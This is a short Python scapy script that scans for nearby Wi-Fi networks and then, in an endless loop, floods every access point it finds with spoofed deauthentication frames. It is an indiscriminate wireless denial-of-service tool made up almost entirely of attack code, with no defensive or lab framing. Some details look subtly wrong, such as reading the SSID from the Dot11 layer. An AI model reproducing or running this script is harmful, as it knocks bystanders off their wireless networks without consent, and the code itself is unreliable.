import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Deauth
from scapy.all import sniff

# Define the interface to use
interface = "wlan0"  # Change this to your wireless interface

# List to store networks
scanned_networks = []

# Define the function to send deauth packets
def send_deauth(bssid):
    # Create a deauth packet with the BSSID
    packet = Dot11(type=0, subtype=12, addr1=bssid, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    scapy.sendp(packet, iface=interface, count=100, verbose=0)

# Define the function to scan for nearby networks
def scan_networks():
    def packet_handler(pkt):
        if pkt.haslayer(Dot11):
            bssid = pkt[Dot11].addr2
            ssid = pkt[Dot11].info.decode() if pkt[Dot11].info else "<hidden>"
            if (bssid, ssid) not in scanned_networks:
                scanned_networks.append((bssid, ssid))

    # Use scapy to sniff for nearby networks
    sniff(iface=interface, prn=packet_handler, count=10)

# Main loop
while True:
    # Clear the scanned networks list before each scan
    scanned_networks.clear()

    # Scan for nearby networks
    scan_networks()

    # Print all scanned connections
    print("Scanned Connections:")
    for bssid, ssid in scanned_networks:
        print(f"BSSID: {bssid}, SSID: {ssid}")

    # Loop through each network and send deauth packets
    for bssid, ssid in scanned_networks:
        # Send the deauth packet
        send_deauth(bssid)
